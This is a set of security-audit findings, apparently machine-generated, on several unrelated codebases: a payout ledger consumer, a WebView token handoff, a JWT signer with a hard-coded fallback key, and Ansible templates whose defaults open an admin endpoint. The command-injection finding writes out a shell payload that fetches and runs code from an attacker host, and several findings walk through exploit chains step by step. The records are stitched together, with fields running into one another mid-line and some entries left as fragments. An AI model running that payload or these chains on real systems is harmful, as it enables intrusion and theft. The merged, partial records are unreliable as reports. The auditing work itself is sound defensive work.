findings.impact: Anyone who can put one entry on the `ledger.events` stream - no signing key, no producer credential, no session - can cause a payout row marked 'released' to be written for an arbitrary account, an arbitrary destination and an arbitrary amount, and can drive any account balance arbitrarily negative. The per-entry ceiling (50,000,000 cents), the solvency check and the FOR UPDATE transaction that protect every credit are all skipped, and because the payouts insert and the balance write are separate statements a failure between them leaves a released payout with no ledger movement at all. This is direct money-out, and it is the exact invariant the threat model calls out ('a financial effect must require a verified signature and a replay-proof idempotency key') - both halves of that invariant are defeated by the same message.
findings.recommendation: The single link that breaks the chain is the payload gate: make validatePayload FAIL CLOSED (schema.js:70 should return an error string when validatorFor(type) is null, or consumer.js should refuse any envelope.type not present in EVENT_SCHEMAS), and give 'payout.release.v2' a schema. That alone stops an attacker-shaped v2 payload from ever reaching the handler even while signatures are still in warn mode. The obvious fix - flipping config/default.json:21 to "mode": "enforce" - does NOT close the chain, because consumer.js:60 skips verifySignature entirely for any entry carrying `verified=1`, a field the attacker writes themselves and the HMAC does not cover (signing.js:7). Deleting the `entry.verified !== '1'` short-circuit is therefore required as well, and independently the money-out path should be moved onto applyPosting so the solvency check and the ceiling apply in both directions (ledger.js:28 vs 59-65).

triage.reason: The whole message is attacker-authored: `entry.body` is JSON.parse'd at consumer.js:49 and `entry.verified` is read from the same XADD field list by fieldsToObject (consumer.js:41-45). The broker is configured with no authentication (config/default.json:3, `redis://tallyflow-redis:6379`), matching threat-model profile A3.

Every link is production code on the default configuration. config/default.json is the shipped config and carries mode 'warn'; the v2 handler is registered unconditionally at consumer.js:30; run() at consumer.js:82-106 is the process entry point invoked at consumer.js:108-113. Nothing is behind a test flag, and no fixture is involved (the only fixture, SAMPLE_EVENT at schema.js:77, is a separate ledger.post.v1 object).

scope.established_by: Read of consumer.js, signing.js, schema.js, idempotency.js, ledger.js, handlers/payoutRelease.js and config/default.json end to end. Each step's postcondition was checked against the next step's guard in the source rather than assumed.
scope.narrowed_by: Restricted to `payout.release.v2`. The v1 type is schema-constrained (schema.js:40-51), so amountCents is capped at 50,000,000 and accountId must match the acct_ pattern there; the unbounded variant is specifically the type with no schema. The chain also does not claim SQL injection: the payouts insert at payoutRelease.js:19-23 binds all five values.

findings.title: OS command injection in dlq notifyOldest: attacker-controlled memo from a parked message is interpolated into a shell command
findings.class: OS command injection (CWE-78)
findings.impact: `memo` is read at dlq.js:56 from `envelope.payload?.memo` of a parked entry, and parked bodies are the attacker's own bytes: consumer.js:54 (malformed envelope), :62 (bad signature) and :69 (payload rejected) all XADD `entry.body` verbatim into the DLQ stream. The first two branches run before any payload schema check, so payload.memo is entirely unconstrained there -- neither the 280-char cap (schema.js:36) nor escapeHtml (ledgerPosting.js:9) applies, because the message never reaches a handler. node:child_process.exec runs the string through /bin/sh, and double quotes do not neutralise command substitution, so a body such as {"payload":{"memo":"$(curl http://attacker/x|sh)"}} executes arbitrary commands as the operator running `node src/dlq.js notify` (dlq.js:75, wired to `npm run dlq`). `entry.reason` is interpolated the same way and for the malformed-envelope branch it carries ajv errorsText output derived from attacker-chosen property names (consumer.js:54). Reaching the sink needs no valid signature and no valid schema -- deliberately malformed messages are the easiest way in, and notifyOldest deliberately picks the *oldest* parked entry, which the attacker controls by being early.

findings.title: Payout debit uses the unchecked adjustBalance path, skipping the solvency and ceiling checks and not sharing a transaction with the payout row
findings.class: Business-logic flaw: money-out path bypasses ledger invariants; non-atomic multi-statement money movement (CWE-841)
findings.evidence: await ledger.adjustBalance(p.accountId, -Math.abs(p.amountCents))
findings.impact: Money entering the ledger goes through applyPosting, which rejects non-integer or zero amounts (ledger.js:9-11), enforces config.limits.maxPostingCents (ledger.js:12-14) and refuses any write that would make the balance negative, inside a SELECT ... FOR UPDATE transaction (ledger.js:18-28). Money *leaving* goes through adjustBalance (ledger.js:59-65), a bare upsert with no amount validation, no ceiling and no solvency check -- so a payout can drive an account arbitrarily negative, i.e. release funds the account never held, and can exceed the per-entry ceiling that the same module enforces on the inbound side. Nothing else re-checks: the handler never reads the balance (ledger.readBalance is never called anywhere), never re-confirms an approval, and takes `destination` straight from the producer. Separately, the payouts INSERT (payoutRelease.js:19-23) and the balance debit (line 28) execute as two independent statements on the pool with no enclosing transaction, so a failure between them leaves a row marked status 'released' with no corresponding debit -- and because idempotency.complete only runs afterwards (line 31) and idempotency.release is never called anywhere, the key stays pinned 'in-flight' for the full 7-day TTL, so the inconsistency is never reconciled by a retry. The doc comment at ledger.js:58 says adjustBalance is 'used by the settlement reconciliation', yet grep shows payoutRelease.js:28 is its only caller.
findings.recommendation: Route the payout debit through applyPosting (or an equivalent that keeps the FOR UPDATE + solvency + ceiling checks) and wrap the payouts insert and the debit in one transaction on a single client, committing only if both succeed. Re-read the balance and re-check the amount against an authorisation record before releasing.

findings.title: Payload validation fails open for a type with no schema, and payout.release.v2 is a registered handler with no schema
findings.class: Improper input validation / advisory-only schema check (CWE-20)
findings.impact: validatePayload signals 'valid' by returning null, and it returns null when no validator exists for the type. consumer.js:66-71 treats that as a pass. EVENT_SCHEMAS (schema.js:27-52) defines only 'ledger.post.v1' and 'payout.release.v1', but consumer.js:30 registers a live handler for 'payout.release.v2' -- grep confirms that string appears nowhere else in the component. A message of type 'payout.release.v2' therefore reaches makePayoutReleaseHandler with a completely unchecked payload: accountId escapes the ^acct_[0-9a-f]{16}$ pattern (schema.js:7), amountCents escapes integer/minimum 1/maximum 50000000 (schema.js:46), destination escapes maxLength 64, and idempotencyKey escapes maxLength 128. That payload is then written into the payouts table (payoutRelease.js:19-23) and turned into money movement by `-Math.abs(p.amountCents)` at payoutRelease.js:28, where a string like "1e12" or a value far above the per-entry ceiling is accepted because adjustBalance performs no checks of its own. Combined with the warn-mode signature verdict, this is an unauthenticated arbitrary-amount payout to an attacker-chosen destination.
findings.recommendation: Make an unknown type a hard failure: return an error string from validatePayload when validatorFor is null, and add a startup assertion that every key of HANDLERS has a corresponding entry in EVENT_SCHEMAS (the v2 handler registration is the proof that the two tables drift).

findings.title: Session access token is placed in the URL query string of the page loaded in the WebView
findings.class: Sensitive credential transmitted in a URL query string (CWE-598)
findings.evidence:
url.searchParams.set('sso', token)
  return url.toString()
findings.impact: The live Bearer access token is appended as a query parameter to a URL that is then loaded as the WebView's source (WebPane.tsx:48). Query strings are the least private part of a request: the token lands in the web server's and any intermediate proxy's access logs, in the WebView's navigation history and session restore state, and is readable via location.search by every script executing on that page, including third-party analytics or tag-manager code the first-party page embeds. Because originWhitelist is ['*'] (WebPane.tsx:49) the pane follows redirects off the first-party origin, and a token-bearing URL emits the full URL in the Referer header on such a navigation and on cross-origin subresource requests unless a referrer policy suppresses it - none is set by the app. The attacker also fully controls the path and remaining query of the first-party URL (router.ts:54), so the token can be steered at any endpoint of app.harborlight.app the attacker prefers, including one that logs or reflects its input.
findings.recommendation: Do not put the token in the URL. Deliver it after load through the existing bridge, gated on a verified origin, or exchange it server-side for a single-use, short-lived hand-off code that the web surface redeems for a cookie. If a query parameter is unavoidable, make it a one-time nonce with a lifetime of seconds and have the web app strip it via history.replaceState immediately on load.

The behaviour is unconditional and observable in the loaded URL; it needs no race. The severity of the downstream leak varies with the page's own subresources, which is why this is rated medium rather than high.
WHATWG URL is used correctly; the objection is to what is being placed in the URL, not how.
The origin check on line 59 is acknowledged as effective for its own purpose and is not contested here; this finding concerns what happens after that check passes.
No debug flag involved; the line runs in every profile.
Not a DoS claim.

findings.title: Service tokens fall back to a hard-coded signing key when SERVICE_TOKEN_KEY is unset
findings.class: Use of hard-coded cryptographic key (CWE-321) / insecure default with silent fallback
findings.evidence:
src/auth.ts:99-106:
  const key = new TextEncoder().encode(process.env.SERVICE_TOKEN_KEY ?? 'local-development-key')
  return new SignJWT({ act: client.account, roles: client.roles })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuer(ISSUER)
    .setAudience('pulsegate-api')
    .setSubject(`svc:${grant.client_id}`)
    .setExpirationTime('1h')
    .sign(key)
findings.impact: In any environment where SERVICE_TOKEN_KEY is not set, every machine-to-machine token is signed with the literal string 'local-development-key', which is in the source tree. findings.recommendation: Fail closed at startup when SERVICE_TOKEN_KEY is missing instead of substituting a literal, and sign service tokens with the same asymmetric key material the JWKS publishes so that mint and verify share one trust root.

A signing key is the security control itself, not a hardening extra.
Nothing fragile: the default is applied on every mint in any environment where the variable is absent, and the process boots identically either way.
jose is used correctly; the problem is the key material handed to it.
No effective mitigation is being stretched. The only guard on this path is the client-secret emptiness check at auth.ts:96; the signing key is never validated.

Traced rather than assumed: /oauth/token is registered unconditionally at index.ts:27 and edge.conf:51 proxies it, so the minting path is production-reachable. The literal is not confined to a dev-only branch - it is the fallback for the production branch.

FP-08 is a preservation rule rather than a kill rule: a hard-coded secret stays a valid finding even with no demonstrated consumer, which is precisely the basis for keeping this one.
There is no mitigation to hallucinate around: the only emptiness guard in this function is on the client secret (auth.ts:96), not on the signing key.
auth.ts:99 is the exact line that holds the literal.
No SIMD or vector padding is involved.
auth.ts:91-107 re-read; the quoted block is a literal substring and line 99 is the `?? 'local-development-key'` assignment.

findings.impact: rotated_password is the live database credential read from Vault at rotate-secrets.yml:7. The `never` tag prevents accidental execution but is not a confidentiality control: the task exists to be run, by its own tag name, with `--tags troubleshoot`. findings.title: Exploit Chain: production appservers accept a caller-asserted identity header and then admit every subject to /admin, because both defaults land in the same rendered env file
findings.class: exploit chain
findings.evidence:
STEP 1 - identity becomes caller-asserted. app.env.j2:11-14:
# `jwt` verifies the OIDC access token on every request. `trusted-header` takes
# the caller identity from X-Stanchion-Subject, which is what the pre-production
# fleet uses so the smoke tests can impersonate any tenant.
AUTH_MODE={{ 'jwt' if app_profile == 'hardened' else 'trusted-header' }}
`app_profile` is `standard` for every host (group_vars/all.yml:17) and is overridden to `hardened` only for the edge group (group_vars/edge.yml:3). site.yml:9 runs the app role on `appservers:edge`, and inventory/production.yml:14-21 gives app-01/02/03 no group_vars or host_vars override - so those three production hosts render AUTH_MODE=trusted-header. POSTCONDITION: the caller chooses their own subject string.

STEP 2 - PRECONDITION OF THE SECOND DEFECT IS EXACTLY A SUBJECT STRING, and the allow-list that should constrain it accepts anything. app.env.j2:16-17:
# Comma separated list of subjects allowed on /admin.
ADMIN_SUBJECTS={{ stanchion_admins | default(['*']) | join(',') }}
`stanchion_admins` is defined in exactly one place - group_vars/edge.yml:6-8, the two service accounts svc-release@ and ops-oncall@ - so it is undefined for every host outside the edge group and the Jinja `default(['*'])` fires. The same three production appservers therefore render ADMIN_SUBJECTS=*.

STEP 3 - the composition. Each default alone leaves one obstacle standing: with trusted-header alone the attacker must still name a subject that appears in the allow-list, and with a wildcard allow-list alone (the edge tier's situation, were it not hardened) the attacker must still obtain a valid OIDC token for some subject. Rendered together into the same file on the same hosts, both obstacles vanish: a caller sends `X-Stanchion-Subject: anything` and is admitted to /admin. The two values are produced by one template task (tasks/main.yml:39-47) and read by one process (the systemd unit's EnvironmentFile, tasks/main.yml:97), so they are always both present or both absent.
findings.impact: On app-01, app-02 and app-03 the administrative surface of the production API is reachable with no token, no certificate and no knowledge of any operator's identity - the caller invents a subject and is both authenticated and authorised by two independent fail-open defaults. The edge tier is not affected (group_vars/edge.yml:3 sets the hardened profile, giving it AUTH_MODE=jwt and the two-name allow-list), so the exposure is on the internal tier, and the practical entry point is an actor that can reach an appserver's app port: the same unprivileged local account described in the sibling chain (profile A6), a compromised neighbouring container, or whatever proxies to those hosts. The value of the composition is that the standard remediation - 'the pre-production default only affects pre-production' - is false here, and that neither of the two changes fixes the other.
findings.recommendation: The single link that breaks the chain is the identity one: make AUTH_MODE fail closed, i.e. render `jwt` unless a profile explicitly and positively selects the header mode (app.env.j2:14), or set app_profile: hardened for the appservers group. With OIDC verification on, a wildcard ADMIN_SUBJECTS still requires a valid token for a real subject, which is a privilege problem rather than an open door. The obvious fix - defining `stanchion_admins` for the appservers group so ADMIN_SUBJECTS is no longer `*` - does NOT close the chain: under trusted-header the attacker reads the allow-list from the same world-readable app.env (see the `chmod -R a+rX` handler at roles/app/handlers/main.yml:15-19) and simply asserts one of the listed subjects. Both defaults should be inverted so that an undefined variable denies rather than admits.

triage.reason: The attacker-controlled value at the entry point is the request header X-Stanchion-Subject, named by the template's own comment (app.env.j2:12) as the identity source under this mode. The subject string is chosen freely by the caller and is what the second link's allow-list then evaluates.

[normalised from a partial answer to UNKNOWN: the rule does not kill the finding, but the reservation below is unresolved] The rendering is unambiguously production: site.yml:9 applies the app role to appservers:edge, inventory/production.yml carries stanchion_env: production, and app-01/02/03 have no override for app_profile or stanchion_admins, so both values are rendered as described on real production hosts. The reservation is network reachability of the app port: tasks/main.yml:58 publishes the container as `127.0.0.1:{{ app_listen_port }}:8080`, so the listener is bound to loopback on those hosts, and the repository contains no nginx site configuration or other reverse proxy definition for the appservers tier (only a `reload nginx` handler). The chain is therefore reachable from on-host or from whatever fronts those hosts outside this repo - recorded as probable, and rated by that entry position rather than as an internet-facing bypass.

findings.title: Idempotency key is producer-chosen and bound to no dimension of the payout, in one global namespace shared by both payout types
findings.class: Insufficient replay/duplicate protection; attacker-controlled deduplication key (CWE-294)
findings.evidence: const key = p.idempotencyKey ?? envelope.id
findings.impact: The key is a free-form producer string (schema.js:49: type string, maxLength 128, no pattern) used verbatim under the single global prefix 'ik' (idempotency.js:15, config/default.json:25). It encodes no dimension of the operation -- not accountId, not amountCents, not destination, not the event type -- and payout.release.v1 and payout.release.v2 share the namespace. Consequences: (a) an attacker who submits a message with a key that a legitimate producer will later use claims it first at idempotency.js:16, and the real payout then short-circuits at payoutRelease.js:13-16 and is never paid, returning the attacker's stored result; (b) because the key is not bound to the amount or destination, a key completed for a small payout makes any later payout carrying that key answer with the stored result instead of executing -- or, if the attacker completes it, lets a chosen result be replayed to the caller; (c) keys expire after ttlSeconds 604800 (config/default.json:24), so the identical envelope replayed after 7 days is 'fresh' again and pays a second time -- and the freshness window that would otherwise stop that (signing.js:34-35) is discarded while mode is "warn". idempotency.release (idempotency.js:27) is dead code -- no caller anywhere -- so a handler that throws after the claim leaves the key pinned 'in-flight' for the whole TTL and that payout can never be made.
findings.recommendation: Derive the key server-side from an authenticated tuple (event type + accountId + destination + amountCents + producer key id) rather than trusting a producer string, namespace it per event type, and store the completed result keyed to the request digest so a mismatched replay is rejected instead of answered.

findings.class: Missing re-authentication on a security-significant operation (CWE-306, CWE-862)

findings.title: Entitlement cache key omits the role dimension, so a role-filtered feature list is served to the wrong actors
findings.class: Cache key collision - cached authorization decision keyed without the identity dimension it depends on
findings.impact: The feature list stored under ent:v3:<accountId> is whichever one the first caller in the 300-second window was entitled to. findings.title: Production hardening block is gated on a group that does not exist, so the auditd watch on the secret file never installs
findings.class: security control silently disabled (unsatisfiable condition)
findings.evidence:
- name: Apply the production hardening profile
  when: "'production' in group_names"
  block:
findings.impact: `group_names` is the list of inventory GROUPS the current host belongs to. inventory/production.yml defines four groups -- edge, appservers, bastion, datastores (lines 7, 14, 23, 29) -- and none of them is called `production`. The string 'production' appears in the inventory only as the value of the `stanchion_env` variable at line 3, which never enters group_names. The condition is therefore false for every host in the only inventory the repo ships, and the whole block is skipped on every run: the three sysctl hardening settings never apply, and, more importantly, the auditd rule at lines 77-84 that watches {{ stanchion_root }}/app.env for write and attribute changes is never written to /etc/audit/rules.d/. The result is worse than an absent control, because the repository reads as if production is audited and hardened: an operator reviewing this role, or an auditor checking that changes to the credential file are recorded, would conclude the watch exists. It does not, so the world-readable chmod performed by the 'refresh static assets' handler and any tampering with the release tree leave no audit trail.
findings.recommendation: Gate on the variable that actually carries the environment -- `when: stanchion_env == 'production'` -- or add a `production` parent group in inventory/production.yml containing the four child groups. Then add an assert that fails the play when stanchion_env is 'production' and the block was skipped, so the control cannot silently disappear again.
